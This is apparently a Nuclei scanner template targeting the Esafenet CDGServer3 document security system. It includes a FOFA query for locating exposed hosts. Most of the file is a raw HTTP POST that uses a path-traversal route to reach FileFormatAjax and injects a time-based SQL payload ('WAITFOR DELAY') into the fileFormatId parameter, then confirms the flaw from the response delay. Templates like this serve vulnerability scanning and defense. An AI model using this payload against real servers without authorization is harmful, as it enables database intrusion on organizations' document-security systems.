id: esafenet-cdgserver3-FileFormatAjax-sqli

info:
  name: 亿赛通电子文档安全管理系统 FileFormatAjax - sqli
  author: leadlife
  severity: high
  description: 
  reference: 
    - 
  metadata:
    verified: true
    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
  tags: esafenet,sqli,time

http:
  - raw:
      - |
        @timeout: 15s
        POST /CDGServer3/PerOrgServlet/../FileFormatAjax HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
        Content-Length: 62
        Accept: */*
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: application/x-www-form-urlencoded

        command=delFileFormat&fileFormatId=12';WAITFOR DELAY '0:0:6'--

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - duration >= 5 && duration < 9
          - contains(header,'CDGServer3')
        condition: and